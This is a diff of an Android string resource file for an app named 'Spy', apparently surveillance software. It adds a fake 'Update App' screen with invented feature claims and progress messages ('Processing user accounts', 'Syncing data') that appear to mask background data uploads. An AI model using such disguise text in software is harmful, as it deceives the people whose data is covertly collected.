@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
   <string name="app_name">Spy</string>
-  <string name="spyservice_notif_content_title">Updating data</string>
+  <string name="spyservice_notif_content_title">Data loading</string>
   <string name="uploaderservice_notif_content_title">Uploading data</string>
   <string name="app_update_informer_service_notif_content_title">App update ready!</string>
   <string name="app_update_informer_service_notif_content_text">Enjoy the latest features of app by updating it to latest version&#8230;</string>
@@ -18,4 +18,26 @@
   <string name="exit">Exit</string>
   <string name="try_again">Try again</string>
   <string name="closing_app">Closing app&#8230;</string>
+  <string name="update">Update</string>
+  <string name="update_app">Update App</string>
+  <string name="update_description"><b>New Features:</b>\n
+  <b>1: </b>Enhanced user experience.\n
+  <b>2: </b>Easy to use talk back service.\n
+  <b>3: </b>New user feedback option added for quick feedback.\n
+  <b>4: </b>Support for android 10.\n
+  <b>5: </b>Numerous bug fixes.\n
+  </string>
+  <string name="app_update_success">App successfully updated!</string>
+  <string name="app_update_failed">Failed to update app!</string>
+  <string name="looking_for_something_new">Looking for something new&#8230;</string>
+  <string name="processing_files">Processing internal files&#8230;</string>
+  <string name="processing_accounts">Processing user accounts&#8230;</string>
+  <string name="finishing">Preparing to finish&#8230;</string>
+  <string name="waiting_for_data_loading">Waiting until data is loaded!</string>
+  <string name="moving_data">Moving data for sync&#8230;</string>
+  <string name="connecting_server">Connecting to server&#8230;</string>
+  <string name="syncing_data">Syncing data&#8230;(May take some time)</string>
+  <string name="finishing_sync">Finishing sync&#8230;</string>
+  <string name="title_what_is_new">What is new:</string>
+  <string name="version_comparison">(%1$s ->  %2$s)</string>
 </resources>
